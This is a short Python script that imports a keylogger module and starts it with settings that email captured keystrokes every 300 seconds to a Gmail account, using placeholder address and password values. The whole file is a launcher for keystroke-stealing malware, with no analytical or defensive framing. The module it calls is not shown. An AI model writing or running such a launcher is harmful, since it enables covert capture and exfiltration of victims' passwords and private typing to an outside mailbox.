#!/usr/bin/env python
import keylogger
# enter email and password for receiving mails
keylogger_object = keylogger.Keylogger(300, "example@gmail.com", "EmailPassword")
keylogger_object.start()
